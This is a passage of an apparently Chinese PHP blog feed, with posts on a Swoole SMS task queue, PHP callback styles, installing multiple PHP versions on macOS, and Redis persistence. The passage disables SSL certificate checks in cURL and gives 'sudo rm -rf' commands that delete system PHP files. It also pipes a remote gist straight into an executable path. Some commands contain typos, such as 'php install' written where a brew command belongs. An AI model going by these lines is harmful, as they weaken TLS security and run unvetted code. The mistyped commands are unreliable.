false);</span><br><span class="line">curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);</span><br><span class="line">&#125;</span><br><span class="line">if(!empty($headers))  curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);</span><br><span class="line">&#x2F;&#x2F; 执行</span><br><span class="line">$result &#x3D; curl_exec ( $curl );</span><br><span class="line">if ( $result &#x3D;&#x3D; FALSE) return false;</span><br><span class="line">&#x2F;&#x2F; 关闭资源</span><br><span class="line">curl_close ( $curl );</span><br><span class="line">return $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 写入日志</span><br><span class="line"> * @param $content</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function addLog($content)&#123;</span><br><span class="line">$path &#x3D; dirname(__FILE__).&quot;&#x2F;logs&#x2F;&quot;;</span><br><span class="line">if (!is_dir($path))</span><br><span class="line">mkdir($path,0777,true);</span><br><span class="line"></span><br><span class="line">$file_name &#x3D; $path.date(&quot;Y_m_d&quot;) . &quot;.log&quot;;</span><br><span class="line">if (!file_exists($file_name)) &#123;</span><br><span class="line">touch($file_name);</span><br><span class="line">chown($file_name, &quot;root&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file_log &#x3D; fopen($file_name, &quot;a&quot;);</span><br><span class="line">fputs($file_log, $content);</span><br><span class="line">fclose($file_log);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$server &#x3D; new taskServer();</span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>这里的客户端可以是 cli 脚本，也可以是对应控制器中的具体方法，只要能连接Swoole 监听的Tcp 就行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\admin\controller;</span><br><span class="line"></span><br><span class="line">class Index extends Base</span><br><span class="line">&#123;</span><br><span class="line">    public function index()&#123;</span><br><span class="line">        $client &#x3D; new \Swoole\Client(SWOOLE_SOCK_TCP);</span><br><span class="line">      if (!$client-&gt;connect(&#39;0.0.0.0&#39;, 9501)) &#123;</span><br><span class="line">      return json(&quot;connect failed. Error: &#123;$client-&gt;errCode&#125;\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      $data &#x3D; [</span><br><span class="line">  &quot;url&quot; &#x3D;&gt; &quot;https:&#x2F;&#x2F;api.paasoo.com&#x2F;json&quot;,</span><br><span class="line">  &quot;data&quot; &#x3D;&gt; [</span><br><span class="line">  &quot;key&quot; &#x3D;&gt; &quot;key&quot;,</span><br><span class="line">  &quot;secret&quot; &#x3D;&gt; &quot;secret&quot;,</span><br><span class="line">  &quot;from&quot; &#x3D;&gt; &quot;sms&quot;,</span><br><span class="line">  &quot;to&quot; &#x3D;&gt; &quot;mobile_phone&quot;,</span><br><span class="line">  &quot;text&quot; &#x3D;&gt; &quot;test&quot;,</span><br><span class="line">  ],</span><br><span class="line">  &quot;type&quot; &#x3D;&gt; &quot;get&quot;</span><br><span class="line">  ];</span><br><span class="line">    $client-&gt;send(json_encode($data));</span><br><span class="line">    return json($client-&gt;recv());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.phpernote.com/php-function/1450.html" target="_blank" rel="noopener">php使用Swoole来实现实时异步任务队列</a></li><li><a href="https://learnku.com/articles/43752" target="_blank" rel="noopener">基于 swoole 下 异步消息队列 API</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近接手一个对接短信的需求，这个需求本身并没有什么难度，直接按照服务商的要求请求具体的接口就好了。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Swoole" scheme="https://www.0x2beace.com/tags/Swoole/"/>
    
  </entry>
  
  <entry>
    <title>PHP 的四种设置回调函数的方式</title>
    <link href="https://www.0x2beace.com/php-s-four-ways-to-set-callback-functions/"/>
    <id>https://www.0x2beace.com/php-s-four-ways-to-set-callback-functions/</id>
    <published>2020-11-25T14:18:04.000Z</published>
    <updated>2020-11-25T14:19:29.255Z</updated>
    
    <content type="html"><![CDATA[<p>最近在学习<code>Swoole</code>，顺手整理一下<code>PHP</code> 中的四种设置回调函数的方式。</p><a id="more"></a><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$server-&gt;on(&quot;request&quot;, function($request, $respone)&#123;</span><br><span class="line">  echo &quot;Http Server&quot;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="类静态函数"><a href="#类静态函数" class="headerlink" title="类静态函数"></a>类静态函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class A&#123;</span><br><span class="line">  static function onConnect($server, $fd)&#123;</span><br><span class="line">    echo &quot;UDP Server&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$server-&gt;on(&quot;connect&quot;, &quot;A::onConnect&quot;);</span><br><span class="line">$server-&gt;on(&quot;conncet&quot;, [&quot;A&quot;, &quot;onConnect&quot;]);</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$server-&gt;on(&quot;connect&quot;, &quot;callBack&quot;);</span><br><span class="line"></span><br><span class="line">function callBack($server, $fd)&#123;</span><br><span class="line">  echo &quot;Tcp Server&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a>对象方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 情景一</span><br><span class="line">Class A&#123;</span><br><span class="line">  public function __construct()&#123;</span><br><span class="line">    $this-&gt;server-&gt;on(&quot;open&quot;, [$this, &quot;onOpen&quot;]);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  public function onOpen($server, $request)&#123;</span><br><span class="line">    echo &quot;WebSocket Server&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"># 情景二</span><br><span class="line">Class A&#123;</span><br><span class="line">  function onOpen($request, $respone)&#123;</span><br><span class="line">    echo &quot;WebSocket Server&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj &#x3D; new A();</span><br><span class="line">$server-&gt;on(&quot;open&quot;, [$obj, &quot;onOpen&quot;]);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在学习&lt;code&gt;Swoole&lt;/code&gt;，顺手整理一下&lt;code&gt;PHP&lt;/code&gt; 中的四种设置回调函数的方式。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>如何在 Mac OS 上安装多版本的 PHP</title>
    <link href="https://www.0x2beace.com/how-to-install-multiple-versions-of-php-on-mac-os/"/>
    <id>https://www.0x2beace.com/how-to-install-multiple-versions-of-php-on-mac-os/</id>
    <published>2020-11-24T15:42:11.000Z</published>
    <updated>2020-11-24T15:45:22.053Z</updated>
    
    <content type="html"><![CDATA[<p>很久之前在Mac 上做开发，起初搭建环境时遇到了部分问题，加上Mac 预装的那个PHP 版本，实在是不好用，<code>php-fpm</code> 总是启不动，最后索性决定在本地自己装个多版本，可以随时自由切换。</p><a id="more"></a><blockquote><p>是否需要清除旧版本？</p></blockquote><p>因为需要在Mac 上安装其他版本，所以预装的那个版本的PHP 的存在就没啥意义了。<br>考虑到本机的其他软件可能会依赖它，为了给以后省些事，最后还是决定将预装的版本给移除掉。</p><p>事实证明移除了也没关系。</p><h2 id="移除旧版本"><a href="#移除旧版本" class="headerlink" title="移除旧版本"></a>移除旧版本</h2><p>这里说的旧版本指的是Mac 自带的PHP版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;private&#x2F;etc&#x2F;</span><br><span class="line">$ sudo rm -rfi php-fpm.conf.default php-fpm.conf php.ini.default php-fpm.d&#x2F;</span><br><span class="line"># &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">$ sudo rm -rfi php php-config phpize</span><br><span class="line"># &#x2F;usr&#x2F;lib&#x2F;</span><br><span class="line">$ sudo rm -rf php&#x2F;</span><br><span class="line"># &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">$ sudo rm -rf php-fpm</span><br><span class="line"># &#x2F;usr&#x2F;share&#x2F;</span><br><span class="line">$ sudo rm -rf php</span><br><span class="line"># &#x2F;usr&#x2F;share&#x2F;man&#x2F;man1&#x2F;</span><br><span class="line">$ sudo rm -rf php-config.1 php.1 phpize.1</span><br></pre></td></tr></table></figure><p>执行完上面这些命令就能将旧版本的PHP 彻底的从你的Mac 上移除了。</p><h2 id="安装多版本"><a href="#安装多版本" class="headerlink" title="安装多版本"></a>安装多版本</h2><p>直到2018年3月底，所有PHP 相关的brew 都由 <code>homebrew/php</code> tab 处理，但是已经弃用了，所以现在我们使用<code>homebrew/core</code>包中的可用的内容。这应该是一个更好维护但是不太完整的包。</p><p>由于<code>PHP5.6</code>和<code>PHP7.0</code>在 Homebrew 上已被弃用，因为以不被支持，虽然不建议在生产环境中使用，但还是可以在开发环境中使用这些不受支持的版本，可以参考：<a href="https://php.net/supported-versions.php" target="_blank" rel="noopener">PHP支持的版本</a>。</p><p>请记住，Homebrew 正式支持PHP7.1 到 7.3 ，因此如果要安装 PHP5.6或PHP7.0，则需要执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ brew tap exolnet&#x2F;homebrew-deprecated</span><br><span class="line">Updating Homebrew...</span><br><span class="line">&#x3D;&#x3D;&gt; Auto-updated Homebrew!</span><br><span class="line">Updated 1 tap (homebrew&#x2F;core).</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>接下来正式开始安装PHP 的各种版本，并使用简单的脚本来进行版本之间的切换。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ php install php@5.6</span><br><span class="line">$ php install php@7.0</span><br><span class="line">$ php install php@7.1</span><br><span class="line">$ php install php@7.2</span><br><span class="line">$ php install php@7.3</span><br></pre></td></tr></table></figure><p>第一个安装所花费的时间长一些，因为需要安装一堆brew 的依赖，随后其他版本的安装的将很快。</p><p>所安装各版本的PHP都在该目录下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ls &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php</span><br><span class="line">5.6 7.0 7.1 7.2 7.3</span><br><span class="line"></span><br><span class="line"># php.ini 配置文件目录</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;x.x&#x2F;php.ini</span><br></pre></td></tr></table></figure><p>安装完以上版本的PHP 之后，执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ php -v </span><br><span class="line">PHP 7.3.5 (cli) (built: May  2 2019 12:40:36) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.3.5, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.3.5, Copyright (c) 1999-2018, by Zend Technologies</span><br></pre></td></tr></table></figure><p>可以看到目前所使用的PHP 版本是7.3（最后安装完的那个），现在试图切换到第一个安装的PHP 版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew unlink php@7.3 &amp;&amp; brew link --force --overwrite php@5.6</span><br></pre></td></tr></table></figure><p><code>unlick</code> 安装PHP 版本之间不再需要联系，因为默认情况下他们是没有符号链接。</p><p>再次查看当前版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ php -v</span><br><span class="line">PHP 5.6.40 (cli) (built: Apr 23 2019 11:14:34)</span><br><span class="line">Copyright (c) 1997-2016 The PHP Group</span><br><span class="line">Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2016, by Zend Technologies</span><br></pre></td></tr></table></figure><p>切换的挺顺利的，但如果每次需要切换时都需要这样输入就变得很麻烦了，幸运的是，一些勤劳的人已经为我们完成了艰苦的工作，并编写了一个非常方便的脚本——<a href="https://gist.github.com/rhukster/f4c04f1bf59e0b74e335ee5d186a98e2" target="_blank" rel="noopener">PHP切换器脚本</a>。</p><p>将<code>sphp</code>脚本安装到 brew 的标准中<code>/usr/local/bin</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -L https:&#x2F;&#x2F;gist.githubusercontent.com&#x2F;rhukster&#x2F;f4c04f1bf59e0b74e335ee5d186a98e2&#x2F;raw &gt; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sphp</span><br><span class="line">$ chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sphp</span><br></pre></td></tr></table></figure><h3 id="多版本切换"><a href="#多版本切换" class="headerlink" title="多版本切换"></a>多版本切换</h3><p>完成这些步骤后，就能够使用脚本命令切换PHP版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sphp 7.2</span><br></pre></td></tr></table></figure><p>使用时会需要提供管理员密码，相比长长的命令这已经省事很多了。</p><p>好了，到这里就顺利的完成了多版本的PHP 安装以及切换。</p><h3 id="管理-PHP-服务"><a href="#管理-PHP-服务" class="headerlink" title="管理 PHP 服务"></a>管理 PHP 服务</h3><p>在不需要切换版本时，使用<code>brew services</code>命令可以对该版本的PHP 进行管理：</p><p>启动/停止/重启 PHP服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew services start&#x2F;stop&#x2F;restart php</span><br></pre></td></tr></table></figure><p>当PHP 服务启动时，通过查看进程列表，可以发现多了几个名为<code>php-fpm</code> 的进程。</p><p><code>php-fpm</code>的进程所在目录：<code>/usr/local/opt/php/sbin/php-fpm</code></p><p>这个进程很重要，在与 Nginx 交互时，如果没有启动它，通常会收到 <code>502 Bad Gateway</code> 的错误。</p><h4 id="启动-php-fpm"><a href="#启动-php-fpm" class="headerlink" title="启动 php-fpm"></a>启动 php-fpm</h4><p>尽管不需要刻意的去管理这个进程，但如果这个进程意外停止运行了，还是要知道该如何启动它。</p><h5 id="前台启动"><a href="#前台启动" class="headerlink" title="前台启动"></a>前台启动</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;usr&#x2F;local&#x2F;opt&#x2F;php&#x2F;sbin&#x2F;</span><br><span class="line">$ .&#x2F;php-fpm</span><br></pre></td></tr></table></figure><p>用这种方式启动，当使用<code>⌃ C</code>退出时，进程也会跟着退出。</p><h5 id="后台启动"><a href="#后台启动" class="headerlink" title="后台启动"></a>后台启动</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;usr&#x2F;local&#x2F;opt&#x2F;php&#x2F;sbin&#x2F;</span><br><span class="line">$ .&#x2F;php-fpm &amp;</span><br></pre></td></tr></table></figure><p>如果用这种方式启动，就算退出了当前会话，进程会以守护进程的方式运行着。</p><h3 id="检查PHP-版本"><a href="#检查PHP-版本" class="headerlink" title="检查PHP 版本"></a>检查PHP 版本</h3><p>最后再啰嗦两句，如果需要把当前5.6版本切换成7.2，那么需要分别做两件事：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 第一步</span><br><span class="line">$ sphp 7.2</span><br><span class="line"></span><br><span class="line"># 第二步</span><br><span class="line">$ brew services stop php@5.6</span><br><span class="line">$ brew services start php@7.2</span><br></pre></td></tr></table></figure><p>如果只做了这一步，那么你会发现 <code>php -v</code>的版本输出的确是 7.2，但<code>php_info()</code>所打印的结果却还是 5.6。</p><p>这是因为机器上安装了多个PHP 版本，当使用<code>php -v</code>命令时，它将显示默认<code>PHP CLI</code>的版本，而该版本可能不是网站所使用的版本。</p><p>所以找出用于特定网站的PHP 版本的最可靠方法是使用<code>phpinfo()</code>函数。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://segmentfault.com/a/1190000005090828#articleHeader0" target="_blank" rel="noopener">Mac 下 Nginx、PHP、MySQL 和 PHP-fpm 的安装和配置</a></li><li><a href="https://getgrav.org/blog/macos-mojave-apache-multiple-php-versions" target="_blank" rel="noopener">如何在Mac 上安装多版本的PHP</a></li><li><a href="https://mengkang.net/343.html" target="_blank" rel="noopener">如何卸载Mac 预装的PHP</a></li><li><a href="https://linuxize.com/post/how-to-check-php-version/" target="_blank" rel="noopener">如何检查PHP 版本</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;很久之前在Mac 上做开发，起初搭建环境时遇到了部分问题，加上Mac 预装的那个PHP 版本，实在是不好用，&lt;code&gt;php-fpm&lt;/code&gt; 总是启不动，最后索性决定在本地自己装个多版本，可以随时自由切换。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>Redis 持久化快速上手</title>
    <link href="https://www.0x2beace.com/redis-persistence-quick-start/"/>
    <id>https://www.0x2beace.com/redis-persistence-quick-start/</id>
    <published>2020-11-21T11:05:31.000Z</published>
    <updated>2020-11-23T12:34:07.708Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>什么是持久化？</p></blockquote><p>Redis 所有数据都是存储在内存中的，对于数据的更新将异步的保存在磁盘中，当Redis实例重启时，即可利用之前持久化的文件实现数据恢复。</p><a id="more"></a><p>主流数据库的持久化方式：</p><ul><li>快照<ul><li>Mysql dump</li><li>Redis rdb</li></ul></li><li>日志<ul><li>Mysql binlog</li><li>Redis aof</li></ul></li></ul><h2 id="RDB"><a href="#RDB" class="headerlink" title="RDB"></a>RDB</h2><h3 id="什么是RDB？"><a href="#什么是RDB？" class="headerlink" title="什么是RDB？"></a>什么是RDB？</h3><p>Redis 通过一条命令或者某种方式创建 rdb 文件，该文件是二进制格式，存储在硬盘中。</p><p>当需要对Redis 进行恢复时，就可以去加载该文件。数据恢复的程度，取决于 rdb文件（快照）产生的时刻。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201123200707.png" alt=""></p><h3 id="三种触发机制"><a href="#三种触发机制" class="headerlink" title="三种触发机制"></a>三种触发机制</h3><p>Redis 生成 rdb 文件有三种方式，分别是：</p><ul><li>save</li><li>bgsave</li><li>自动策略</li></ul><h4 id="save"><a href="#save" class="headerlink" title="save"></a>save</h4><p>save 命令有如下特点：</p><ol><li>同步阻塞</li><li>文件策略：如果存在旧的rdb 文件，则会替换成新的</li><li>复杂度：O（N）</li></ol><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201123200752.png" alt=""></p><h4 id="bgsave"><a href="#bgsave" class="headerlink" title="bgsave"></a>bgsave</h4><p>bgsave 命令有如下特点：</p><ul><li>异步非阻塞（几乎不会阻塞客户端）</li><li>文件策略和复杂度同上。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201123200804.png" alt=""></p><blockquote><p>save 还是 bgsave？</p></blockquote><table><thead><tr><th>命令</th><th>save</th><th>bgsave</th></tr></thead><tbody><tr><td>IO类型</td><td>同步</td><td>异步</td></tr><tr><td>是否阻塞</td><td>是</td><td>否（阻塞发生在fork()</td></tr><tr><td>复杂度</td><td>O(n)</td><td>O(n)</td></tr><tr><td>优点</td><td>不会消耗额外内存</td><td>不阻塞客户端</td></tr><tr><td>缺点</td><td>阻塞客户端</td><td>需要fork，消耗内存</td></tr></tbody></table><p>在数据量不大的情况下，其实使用save 还是bgsave 并没有什么差异。</p><p>它俩都是需要手动执行命令才会触发机制，那么有没有自动的方式呢？答案是有的。</p><h4 id="自动策略"><a href="#自动策略" class="headerlink" title="自动策略"></a>自动策略</h4><p>自动生成策略是根据某个规则来决定是否生成 rdb 文件，这个过程也是一个bgsave 的过程。</p><p>默认策略：<br>|seconds|changes|<br>|-|-|<br>|900|1|<br>|300|10|<br>|60|10000|</p><p>上述配置的意思是：如果在60s 中做了10000 次改变或者在 300s 中做了 10次 改变，或者在900s 中做了 1 次改变，则均会触发bgsave。</p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#save 900 1</span><br><span class="line">#save 300 10 </span><br><span class="line">#save 60 10000</span><br><span class="line">dbfilename dump.rdb       &#x2F;&#x2F; rdb 文件名称</span><br><span class="line">dir &#x2F;big_disk_path                &#x2F;&#x2F; 工作目录</span><br><span class="line">stop-writes-on-bgsave-error yes   &#x2F;&#x2F; 如果发生错误，停止写入</span><br><span class="line">rdbcompression yes                &#x2F;&#x2F; 采用压缩格式 </span><br><span class="line">rdbchecksum yes                   &#x2F;&#x2F; 对rdb 文件进行检验</span><br></pre></td></tr></table></figure><h3 id="触发机制"><a href="#触发机制" class="headerlink" title="触发机制"></a>触发机制</h3><p>Redis 当达到以下触发机制时，也会自动创建rdb 文件。</p><ol><li>全量复制</li><li>debug reload</li><li>showdown</li></ol><h3 id="RDB-文件恢复"><a href="#RDB-文件恢复" class="headerlink" title="RDB 文件恢复"></a>RDB 文件恢复</h3><p>前面已经提到过了，持久化的目的是为了解决内存异常导致的数据丢失问题，如果真的遇到了这样的情况，RDB 文件又是如何实现数据恢复的呢？</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201123200830.png" alt=""></p><p>因为开启持久化之后，数据会存储到名为 dump.rdb 的文件中，当 Redis 服务器重启时，检测到 dump.rdb 文件后，就会自动加载进行数据恢复。</p><h2 id="AOF"><a href="#AOF" class="headerlink" title="AOF"></a>AOF</h2><p>在正式介绍什么是AOF 之前，我们先来了解一下RDB 方式现存的问题。</p><ol><li>耗时、耗性能</li><li>不可控、丢失数据</li></ol><h3 id="什么是AOF？"><a href="#什么是AOF？" class="headerlink" title="什么是AOF？"></a>什么是AOF？</h3><p>与RDB 不同的是，它是通过保存所执行的写命令来实现的，并且保存的数据格式是客户端发送的命令。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201123200915.png" alt=""></p><h3 id="三种策略"><a href="#三种策略" class="headerlink" title="三种策略"></a>三种策略</h3><p>Redis 在执行写命令时，首先写入硬盘的缓冲区，缓冲区会根据以下三种策略去刷新到磁盘中。</p><ul><li>always：每次写入都把缓冲区 fsync 到硬盘，性能影响最大，占用磁盘 IO 较高，数据安全性最高。</li><li>everysec：每秒把缓冲区 fsync 到硬盘，对性能影响相对较小。</li><li>no：由系统决定是否 fsync。</li></ul><blockquote><p>always 还是 everysec 还是 no？</p></blockquote><table><thead><tr><th>命令</th><th>always</th><th>everysec</th><th>no</th></tr></thead><tbody><tr><td>优点</td><td>不丢失数据</td><td>每秒一次 fsync</td><td>不用管</td></tr><tr><td>缺点</td><td>IO 开销较大，一般的sata 盘只有几百 TPS</td><td>丢一秒数据</td><td>不可控</td></tr></tbody></table><h3 id="AOF-重写"><a href="#AOF-重写" class="headerlink" title="AOF 重写"></a>AOF 重写</h3><p>来看这样一种情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set name php </span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set name c</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set name python</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set name js</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get name </span><br><span class="line">&quot;js&quot;</span><br></pre></td></tr></table></figure><p>虽然set 了很多次，但是name 的值，只受最后一次set 的影响，所以前面那么多次，其实没有必要也保存到AOF 文件中。</p><p>满足所设置的条件时，会自动触发 AOF 重写，此时 Redis 会扫描整个实例的数据，重新生成一个 AOF 文件来达到瘦身的效果。</p><h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; AOF</span><br><span class="line">appendonly yes                              &#x2F;&#x2F; 开启AOF 策略</span><br><span class="line">appendfilename &quot;appendonly-$&#123;port&#125;.aof&quot;     &#x2F;&#x2F; aof 文件名</span><br><span class="line">appendfsync everysec                        &#x2F;&#x2F; 刷新策略</span><br><span class="line">dir &#x2F;big_disk_path                          &#x2F;&#x2F; 工作目录</span><br><span class="line">no-appendfsync-on-write  yes                &#x2F;&#x2F; AOF 重写时，是否需要做AOF 检测操作</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; AOF 重写</span><br><span class="line">auto-aof-rewrite-percentage 100             &#x2F;&#x2F; AOF 文件距离上次文件增长超过多少百分比</span><br><span class="line">auto-aof-rewrite-min-size 64mb              &#x2F;&#x2F; AOF 文件体积最小多大以上触发</span><br></pre></td></tr></table></figure><h3 id="AOF-文件恢复"><a href="#AOF-文件恢复" class="headerlink" title="AOF 文件恢复"></a>AOF 文件恢复</h3><p>与 RBD 文件不同，因为AOF 文件的数据格式，是由命令组成的，所以客户端直接执行每条命令就可以将数据进行恢复。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201123202704.png" alt=""></p><blockquote><p>RDB 还是AOF？</p></blockquote><p>RDB 和AOF 有各自的优缺点，那么到底该选择哪个呢？ 